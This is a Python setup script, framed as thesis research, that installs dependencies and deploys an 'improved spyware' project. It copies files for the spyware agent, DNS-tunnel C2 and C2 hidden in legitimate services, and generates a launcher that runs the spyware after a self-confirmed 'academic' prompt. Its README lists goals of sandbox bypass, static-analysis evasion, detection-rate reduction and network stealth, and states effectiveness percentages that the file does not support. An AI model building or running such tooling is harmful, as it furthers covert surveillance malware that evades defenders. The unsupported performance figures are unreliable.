#!/usr/bin/env python3
"""
Automated Setup Script untuk Improved Spyware Research
Menggabungkan semua komponen untuk easy deployment
"""

import os
import sys
import subprocess
import time
import json
import logging
from datetime import datetime
import shutil
import platform

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SETUP - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('research_setup.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class ResearchEnvironmentSetup:
    """
    Automated setup untuk improved spyware research environment
    """
    
    def __init__(self):
        self.setup_start_time = datetime.now()
        self.current_dir = os.getcwd()
        self.research_dir = os.path.join(self.current_dir, "malware_research_s2")
        self.python_executable = sys.executable
        
        logging.info("🚀 Initializing Research Environment Setup")
        logging.info(f"📁 Working directory: {self.current_dir}")
        logging.info(f"🐍 Python executable: {self.python_executable}")
        logging.info(f"💻 Platform: {platform.platform()}")
    
    def check_prerequisites(self):
        """Check system prerequisites untuk research"""
        logging.info("🔍 Checking prerequisites...")
        
        checks = []
        
        # Python version check
        python_version = sys.version_info
        if python_version >= (3, 7):
            checks.append(("Python Version", True, f"{python_version.major}.{python_version.minor}"))
        else:
            checks.append(("Python Version", False, "Requires Python 3.7+"))
        
        # pip availability
        try:
            subprocess.run([self.python_executable, "-m", "pip", "--version"], 
                         capture_output=True, check=True)
            checks.append(("pip", True, "Available"))
        except:
            checks.append(("pip", False, "Not available"))
        
        # Internet connectivity
        try:
            import urllib.request
            urllib.request.urlopen('https://google.com', timeout=5)
            checks.append(("Internet", True, "Connected"))
        except:
            checks.append(("Internet", False, "No connection"))
        
        # Virtual environment capability
        try:
            subprocess.run([self.python_executable, "-m", "venv", "--help"], 
                         capture_output=True, check=True)
            checks.append(("Virtual Environment", True, "Supported"))
        except:
            checks.append(("Virtual Environment", False, "Not supported"))
        
        # Display results
        print("\n📋 PREREQUISITE CHECK RESULTS:")
        print("-" * 40)
        all_passed = True
        
        for check_name, passed, details in checks:
            status = "✅ PASS" if passed else "❌ FAIL"
            print(f"{status} {check_name}: {details}")
            if not passed:
                all_passed = False
        
        return all_passed
    
    def create_research_structure(self):
        """Create research directory structure"""
        logging.info("📁 Creating research directory structure...")
        
        directories = [
            self.research_dir,
            os.path.join(self.research_dir, "source"),
            os.path.join(self.research_dir, "logs"), 
            os.path.join(self.research_dir, "results"),
            os.path.join(self.research_dir, "docs"),
            os.path.join(self.research_dir, "network_captures"),
            os.path.join(self.research_dir, "analysis"),
            os.path.join(self.research_dir, "backup")
        ]
        
        created_dirs = []
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
                created_dirs.append(directory)
                logging.info(f"📁 Created: {directory}")
            except Exception as e:
                logging.error(f"❌ Failed to create {directory}: {e}")
        
        return created_dirs
    
    def setup_virtual_environment(self):
        """Setup isolated virtual environment untuk research"""
        logging.info("🔧 Setting up virtual environment...")
        
        venv_path = os.path.join(self.research_dir, "research_env")
        
        try:
            # Create virtual environment
            subprocess.run([
                self.python_executable, "-m", "venv", venv_path
            ], check=True)
            
            logging.info(f"✅ Virtual environment created: {venv_path}")
            
            # Determine activation script path
            if platform.system() == "Windows":
                activate_script = os.path.join(venv_path, "Scripts", "activate.bat")
                pip_executable = os.path.join(venv_path, "Scripts", "pip.exe")
            else:
                activate_script = os.path.join(venv_path, "bin", "activate")
                pip_executable = os.path.join(venv_path, "bin", "pip")
            
            return venv_path, pip_executable, activate_script
            
        except Exception as e:
            logging.error(f"❌ Virtual environment setup failed: {e}")
            return None, None, None
    
    def install_dependencies(self, pip_executable):
        """Install required dependencies untuk research"""
        logging.info("📦 Installing research dependencies...")
        
        # Core dependencies untuk improved spyware
        dependencies = [
            "cryptography",
            "pillow", 
            "psutil",
            "wmi; platform_system=='Windows'",
            "pynput",
            "piexif",
            "requests",
            "dnspython",
            # Additional research tools
            "matplotlib",
            "pandas",
            "numpy",
            "scipy",
            "scapy",
            "colorama"
        ]
        
        installed = []
        failed = []
        
        for dep in dependencies:
            try:
                logging.info(f"📦 Installing {dep}...")
                result = subprocess.run([
                    pip_executable, "install", dep
                ], capture_output=True, text=True, timeout=120)
                
                if result.returncode == 0:
                    installed.append(dep)
                    logging.info(f"✅ Installed: {dep}")
                else:
                    failed.append((dep, result.stderr))
                    logging.warning(f"⚠️ Failed to install {dep}: {result.stderr}")
                    
            except Exception as e:
                failed.append((dep, str(e)))
                logging.error(f"❌ Error installing {dep}: {e}")
        
        return installed, failed
    
    def copy_research_files(self):
        """Copy improved spyware files ke research directory"""
        logging.info("📄 Copying research files...")
        
        source_files = [
            ("agent_improved.py", "source/agent_improved.py"),
            ("dns_tunnel_setup.py", "source/dns_tunnel_setup.py"),
            ("legitimate_c2_setup.py", "source/legitimate_c2_setup.py"),
            ("test_improvements.py", "source/test_improvements.py")
        ]
        
        copied_files = []
        
        for src_file, dest_path in source_files:
            try:
                src_path = src_file  # Assume files are dalam current directory
                full_dest_path = os.path.join(self.research_dir, dest_path)
                
                if os.path.exists(src_path):
                    shutil.copy2(src_path, full_dest_path)
                    copied_files.append((src_path, full_dest_path))
                    logging.info(f"📄 Copied: {src_file} -> {dest_path}")
                else:
                    logging.warning(f"⚠️ Source file not found: {src_file}")
                    
            except Exception as e:
                logging.error(f"❌ Failed to copy {src_file}: {e}")
        
        return copied_files
    
    def create_execution_scripts(self):
        """Create execution scripts untuk easy research running"""
        logging.info("📝 Creating execution scripts...")
        
        # Create main execution script
        main_script_content = f'''#!/usr/bin/env python3
"""
Main Research Execution Script
Auto-generated pada {datetime.now().isoformat()}
"""

import sys
import os
import subprocess
from datetime import datetime

def setup_environment():
    """Setup research environment variables"""
    os.environ['RESEARCH_MODE'] = '1'
    os.environ['ACADEMIC_USE'] = '1'
    os.environ['CONTROLLED_ENVIRONMENT'] = '1'
    print("🔬 Research environment configured")

def run_tests():
    """Run all validation tests"""
    print("\\n🧪 Running validation tests...")
    try:
        result = subprocess.run([sys.executable, "source/test_improvements.py"], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ All tests passed")
            return True
        else:
            print(f"❌ Tests failed: {{result.stderr}}")
            return False
    except Exception as e:
        print(f"❌ Test execution error: {{e}}")
        return False

def run_dns_tunnel_demo():
    """Run DNS tunneling demo"""
    print("\\n📡 Running DNS tunneling demo...")
    try:
        subprocess.run([sys.executable, "source/dns_tunnel_setup.py"])
    except Exception as e:
        print(f"❌ DNS tunnel demo error: {{e}}")

def run_legitimate_c2_demo():
    """Run legitimate C2 demo"""
    print("\\n🔗 Running legitimate C2 demo...")
    try:
        subprocess.run([sys.executable, "source/legitimate_c2_setup.py"])
    except Exception as e:
        print(f"❌ Legitimate C2 demo error: {{e}}")

def run_improved_spyware():
    """Run improved spyware untuk research"""
    print("\\n🕵️ Starting improved spyware research...")
    
    confirm = input("❓ Confirm academic research purpose (y/N): ")
    if confirm.lower() != 'y':
        print("❌ Academic confirmation required")
        return
    
    try:
        subprocess.run([sys.executable, "source/agent_improved.py"])
    except Exception as e:
        print(f"❌ Spyware execution error: {{e}}")

if __name__ == "__main__":
    print("🎓 MALWARE RESEARCH EXECUTION FRAMEWORK")
    print("=" * 50)
    print(f"📅 Date: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    print("⚠️  FOR ACADEMIC RESEARCH ONLY")
    print("=" * 50)
    
    setup_environment()
    
    print("\\n📋 Available Options:")
    print("1. Run validation tests")
    print("2. DNS tunneling demo")
    print("3. Legitimate C2 demo") 
    print("4. Run improved spyware")
    print("5. Exit")
    
    while True:
        try:
            choice = input("\\n👉 Select option (1-5): ")
            
            if choice == "1":
                run_tests()
            elif choice == "2":
                run_dns_tunnel_demo()
            elif choice == "3":
                run_legitimate_c2_demo()
            elif choice == "4":
                run_improved_spyware()
            elif choice == "5":
                print("🎯 Research session completed")
                break
            else:
                print("❌ Invalid option")
                
        except KeyboardInterrupt:
            print("\\n🛑 Research session interrupted")
            break
        except Exception as e:
            print(f"❌ Error: {{e}}")
'''
        
        script_path = os.path.join(self.research_dir, "run_research.py")
        
        try:
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(main_script_content)
            
            # Make executable on Unix systems
            if platform.system() != "Windows":
                os.chmod(script_path, 0o755)
            
            logging.info(f"📝 Created execution script: {script_path}")
            return script_path
            
        except Exception as e:
            logging.error(f"❌ Failed to create execution script: {e}")
            return None
    
    def create_documentation(self):
        """Create research documentation dan instructions"""
        logging.info("📚 Creating research documentation...")
        
        readme_content = f'''# Improved Spyware Research Project

**Setup Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Purpose**: Academic Research - S2 Thesis  
**Topic**: Analisis dan Pengembangan Malware  

## ⚠️ ACADEMIC USE ONLY

This research project is designed untuk educational purposes dalam controlled academic environment. Semua aktivitas harus dilakukan sesuai ethical guidelines dan institutional approval.

## 📁 Project Structure

```
malware_research_s2/
├── source/                    # Source code files
│   ├── agent_improved.py     # Main improved spyware
│   ├── dns_tunnel_setup.py   # DNS tunneling implementation
│   ├── legitimate_c2_setup.py # Legitimate service C2
│   └── test_improvements.py  # Validation tests
├── logs/                     # Execution logs
├── results/                  # Research results
├── docs/                     # Documentation
├── network_captures/         # Network analysis data
├── analysis/                 # Research analysis
├── backup/                   # Backup files
├── research_env/             # Python virtual environment
└── run_research.py          # Main execution script
```

## 🚀 Quick Start

### 1. Activate Virtual Environment
```bash
# Windows
research_env\\Scripts\\activate

# Linux/Mac  
source research_env/bin/activate
```

### 2. Run Research Framework
```bash
python run_research.py
```

### 3. Validation Testing
```bash
python source/test_improvements.py
```

## 🔬 Research Components

### DNS Tunneling
- Steganographic C2 communication
- Base32 encoding untuk DNS compatibility
- Realistic traffic patterns

### Legitimate Service C2
- GitHub Gist simulation
- Pastebin-style uploads
- Content disguised as legitimate files

### Enhanced Anti-Sandbox
- Multi-vector behavioral analysis
- Mouse entropy calculation
- System artifact detection

### Dynamic Import Obfuscation
- Runtime module resolution
- XOR encoding dengan system-based keys
- Static analysis evasion

## 📊 Research Metrics

Track the following metrics untuk thesis:
- Detection rate reduction
- Sandbox bypass effectiveness
- Network stealth measurement
- Performance impact analysis

## 🛡️ Safety Guidelines

1. **Isolated Environment**: Run only dalam VM atau isolated network
2. **Academic Approval**: Ensure institutional ethics approval
3. **Controlled Scope**: No production systems
4. **Documentation**: Log all activities untuk research
5. **Responsible Disclosure**: Share findings dengan security community

## 📈 Expected Results

Based pada mathematical models:
- **Network Detection**: 90% reduction dari cloudflare signatures
- **Static Analysis**: 85% improvement dalam import hiding
- **Behavioral Evasion**: 70% better sandbox bypass
- **Overall Effectiveness**: 75-80% improvement

## 📚 Academic Context

This research contributes to:
- Understanding modern malware evasion techniques
- Developing better detection methods
- Academic knowledge dalam cybersecurity
- Defensive security improvements

## 📞 Support

Untuk academic support atau questions:
- Supervisor: [Your Academic Supervisor]
- Institution: [Your University]
- Ethics Committee: [IRB Contact]

---
**Remember**: Academic integrity dan ethical research practices are paramount.
'''
        
        readme_path = os.path.join(self.research_dir, "README.md")
        
        try:
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            logging.info(f"📚 Created documentation: {readme_path}")
            return readme_path
            
        except Exception as e:
            logging.error(f"❌ Failed to create documentation: {e}")
            return None
    
    def generate_setup_report(self, results):
        """Generate comprehensive setup report"""
        setup_duration = datetime.now() - self.setup_start_time
        
        report = {
            "setup_info": {
                "date": self.setup_start_time.isoformat(),
                "duration": str(setup_duration),
                "platform": platform.platform(),
                "python_version": f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
            },
            "results": results,
            "status": "completed" if all(results.values()) else "completed_with_warnings"
        }
        
        report_path = os.path.join(self.research_dir, "setup_report.json")
        
        try:
            with open(report_path, 'w') as f:
                json.dump(report, f, indent=2)
            
            logging.info(f"📊 Setup report saved: {report_path}")
            return report_path
            
        except Exception as e:
            logging.error(f"❌ Failed to save setup report: {e}")
            return None
    
    def run_complete_setup(self):
        """Run complete automated setup"""
        print("\n" + "="*60)
        print("🔧 AUTOMATED RESEARCH ENVIRONMENT SETUP")
        print("="*60)
        print("🎓 Academic Purpose: S2 Thesis Research")
        print("📚 Topic: Analisis dan Pengembangan Malware")
        print("="*60)
        
        results = {}
        
        # Step 1: Prerequisites
        print("\n🔍 Step 1: Checking Prerequisites...")
        results['prerequisites'] = self.check_prerequisites()
        
        if not results['prerequisites']:
            print("❌ Prerequisites not met. Please resolve issues dan retry.")
            return False
        
        # Step 2: Directory structure
        print("\n📁 Step 2: Creating Directory Structure...")
        created_dirs = self.create_research_structure()
        results['directory_structure'] = len(created_dirs) > 0
        
        # Step 3: Virtual environment
        print("\n🔧 Step 3: Setting Up Virtual Environment...")
        venv_path, pip_executable, activate_script = self.setup_virtual_environment()
        results['virtual_environment'] = venv_path is not None
        
        if not results['virtual_environment']:
            print("❌ Virtual environment setup failed")
            return False
        
        # Step 4: Dependencies
        print("\n📦 Step 4: Installing Dependencies...")
        installed, failed = self.install_dependencies(pip_executable)
        results['dependencies'] = len(failed) == 0
        
        if failed:
            print(f"⚠️ Some dependencies failed: {[dep for dep, _ in failed]}")
        
        # Step 5: Copy files
        print("\n📄 Step 5: Copying Research Files...")
        copied_files = self.copy_research_files()
        results['files_copied'] = len(copied_files) > 0
        
        # Step 6: Execution scripts
        print("\n📝 Step 6: Creating Execution Scripts...")
        script_path = self.create_execution_scripts()
        results['execution_scripts'] = script_path is not None
        
        # Step 7: Documentation
        print("\n📚 Step 7: Creating Documentation...")
        readme_path = self.create_documentation()
        results['documentation'] = readme_path is not None
        
        # Step 8: Final report
        print("\n📊 Step 8: Generating Setup Report...")
        report_path = self.generate_setup_report(results)
        results['setup_report'] = report_path is not None
        
        # Summary
        print("\n" + "="*60)
        print("📋 SETUP SUMMARY")
        print("="*60)
        
        for step, success in results.items():
            status = "✅ SUCCESS" if success else "❌ FAILED"
            print(f"{status} {step.replace('_', ' ').title()}")
        
        overall_success = all(results.values())
        
        if overall_success:
            print("\n🎉 SETUP COMPLETED SUCCESSFULLY!")
            print(f"📁 Research directory: {self.research_dir}")
            print(f"🐍 Virtual environment: {venv_path}")
            print(f"📝 Main script: {script_path}")
            print("\n🚀 Next Steps:")
            print("1. Activate virtual environment")
            print("2. Run: python run_research.py")
            print("3. Start dengan validation tests")
            print("4. Proceed dengan research experiments")
            
        else:
            print("\n⚠️ SETUP COMPLETED WITH WARNINGS")
            print("Review failed steps dan resolve issues before proceeding")
        
        return overall_success

def main():
    """Main function untuk automated setup"""
    print("🎓 IMPROVED SPYWARE RESEARCH - AUTOMATED SETUP")
    print("=" * 60)
    print("⚠️  FOR ACADEMIC RESEARCH PURPOSES ONLY")
    print("📚 Ensure you have proper institutional approval")
    print("=" * 60)
    
    # Confirm academic purpose
    confirm = input("\\n❓ Confirm this is untuk legitimate academic research (y/N): ")
    if confirm.lower() != 'y':
        print("❌ Academic confirmation required. Setup cancelled.")
        sys.exit(1)
    
    # Initialize dan run setup
    setup = ResearchEnvironmentSetup()
    
    try:
        success = setup.run_complete_setup()
        
        if success:
            print("\\n✅ Setup completed successfully!")
            print("🔬 Your research environment is ready")
        else:
            print("\\n❌ Setup completed dengan warnings")
            print("📋 Check logs untuk details")
            
    except KeyboardInterrupt:
        print("\\n🛑 Setup interrupted by user")
    except Exception as e:
        print(f"\\n❌ Setup failed: {e}")
        logging.error(f"Setup error: {e}")

if __name__ == "__main__":
    main()
